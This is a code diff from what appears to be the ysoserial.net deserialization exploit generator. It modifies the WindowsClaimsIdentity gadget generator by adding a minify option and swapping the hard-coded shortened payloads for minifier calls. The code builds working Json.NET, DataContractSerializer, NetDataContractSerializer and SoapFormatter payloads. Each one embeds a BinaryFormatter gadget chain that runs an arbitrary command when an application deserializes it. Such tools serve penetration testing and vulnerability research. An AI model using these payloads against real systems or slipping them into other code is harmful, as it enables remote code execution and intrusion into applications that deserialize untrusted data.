@@ -6,6 +6,7 @@ using System.Xml;
 using Newtonsoft.Json;
 using System.Runtime.Serialization.Formatters.Soap;
 using Microsoft.IdentityModel.Claims;
+using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
@@ -60,28 +61,30 @@ namespace ysoserial.Generators
             }
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test)
+        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
         {
             Generator binaryFormatterGenerator = new TypeConfuseDelegateGenerator();
-            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false);
+            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false, minify);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new WindowsClaimsIdentityMarshal(b64encoded);
-                return Serialize(obj, formatter, test);
+                return Serialize(obj, formatter, test, minify);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
-                /*
+               
                 string payload = @"{
                     '$type': 'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35',
                     'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                 }";
-                */
+               
+                if (minify)
+                {
+                    payload = Helpers.JSONMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                }
 
-                // Payload has been shortened - if there is any problem, consider commenting the following payload and re-enable the previous one
-                string payload = @"{'$type':'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity,Microsoft.IdentityModel','System.Security.ClaimsIdentity.actor':'" + b64encoded + @"'}";
 
                 if (test)
                 {
@@ -100,16 +103,18 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-                /*
-                string payload = $@"<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
+                
+                string payload = $@"<root type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
     <WindowsClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims"">
       <System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
        </WindowsClaimsIdentity>
 </root>
 ";
-*/
-                // Payload has been shortened - if there is any problem, consider commenting the following payload and re-enable the previous one
-                string payload = $@"<root type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity,Microsoft.IdentityModel""><WindowsClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims""><System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor></WindowsClaimsIdentity></root>";
+
+                if (minify)
+                {
+                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                }
 
                 if (test)
                 {
@@ -129,7 +134,7 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("netdatacontractserializer"))
             {
-                /*
+
                 string payload = $@"<root>
 <w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
   <_actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</_actor>
@@ -142,9 +147,11 @@ namespace ysoserial.Generators
 </w>
 </root>
 ";
-*/
-                // Payload has been shortened - if there is any problem, consider commenting the following payload and re-enable the previous one
-                string payload = $@"<root><w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/""><_actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</_actor><m_userToken z:Type=""System.IntPtr"" z:Assembly=""0""><value z:Type=""System.Int64"" z:Assembly=""0"">0</value></m_userToken><_label i:nil=""1""/><_nameClaimType i:nil=""1""/><_roleClaimType i:nil=""1""/></w></root>";
+
+                if (minify)
+                {
+                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                }
 
                 if (test)
                 {
@@ -164,7 +171,7 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("soapformatter"))
             {
-                /*
+
                 string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
 <SOAP-ENV:Body>
     <a1:WindowsClaimsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/Microsoft.IdentityModel.Claims/Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
@@ -173,9 +180,11 @@ namespace ysoserial.Generators
 </SOAP-ENV:Body>
 </SOAP-ENV:Envelope>
 ";
-*/
-                // Payload has been shortened - if there is any problem, consider commenting the following payload and re-enable the previous one
-                string payload = $@"<s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/""><s:Body><a:WindowsClaimsIdentity xmlns:a=""http://schemas.microsoft.com/clr/nsassem/Microsoft.IdentityModel.Claims/Microsoft.IdentityModel""><System.Security.ClaimsIdentity.actor>{b64encoded}</System.Security.ClaimsIdentity.actor></a:WindowsClaimsIdentity></s:Body></s:Envelope>";
+
+                if (minify)
+                {
+                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, Helpers.FormatterType.SoapFormatter);
+                }
 
                 if (test)
                 {
